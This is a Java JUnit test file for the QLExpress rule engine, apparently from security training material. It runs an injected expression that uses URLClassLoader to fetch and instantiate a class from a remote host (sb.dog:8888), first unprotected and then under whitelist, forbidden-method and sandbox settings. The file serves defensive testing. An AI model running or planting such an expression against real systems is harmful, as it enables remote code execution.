package org.test;

import com.ql.util.express.DefaultContext;
import com.ql.util.express.ExpressRunner;
import com.ql.util.express.IExpressContext;
import com.ql.util.express.config.QLExpressRunStrategy;
import org.junit.Test;

/**
 * <a href="https://github.com/alibaba/QLExpress">QLExpress</a> security test cases.
 */
public class RuleEngineTest {

    private static final String sample = "url = 'http://sb.dog:8888/'; classLoader = new java.net.URLClassLoader([new java.net.URL(url)]);classLoader.loadClass('Hello').newInstance();";

    /**
     * basic usage
     */
    @Test
    public void basicUsage() throws Exception{
        ExpressRunner runner = new ExpressRunner();
        IExpressContext<String, Object> context = new DefaultContext<>();
        context.put("a", 1);
        context.put("b", 2);
        Object r = runner.execute("a+b", context, null, true, false);
        System.out.println(r);  // print 3
    }

    /**
     * Test case of /rules/case1. Use URLClassLoader to load remote class.
     */
    @Test
    public void case1() throws Exception {
        System.out.println(sample);
        ExpressRunner runner = new ExpressRunner();
        IExpressContext<String, Object> context = new DefaultContext<>();
        Object r = runner.execute(sample, context, null, true, false);
        System.out.println(r);
    }

    /**
     * fix method by using class and method whitelist.
     */
    @Test
    public void sec01() throws Exception {
        System.out.println(sample);
        ExpressRunner runner = new ExpressRunner();
        QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true);
        QLExpressRunStrategy.addSecureMethod(String.class, "length");
        IExpressContext<String, Object> context = new DefaultContext<>();
        Object r1 = runner.execute("'abc'.length()", context, null, true, false);
        System.out.println(r1);
        Object r2 = runner.execute(sample, context, null, true, false);
        System.out.println(r2);
    }

    
    @Test
    public void sec02() throws Exception {
        System.out.println(sample);
        ExpressRunner runner = new ExpressRunner();
        QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true);
        IExpressContext<String, Object> context = new DefaultContext<>();
        Object r = runner.execute(sample, context, null, true, false);
        System.out.println(r);
    }


    /**
     * <p>Fix method by using sandbox. </p>
     */
    @Test
    public void sec03() throws Exception {
        System.out.println(sample);
        ExpressRunner runner = new ExpressRunner();
        QLExpressRunStrategy.setSandBoxMode(true);
        IExpressContext<String, Object> context = new DefaultContext<>();
        Object r = runner.execute(sample, context, null, true, false);
        System.out.println(r);
    }
}
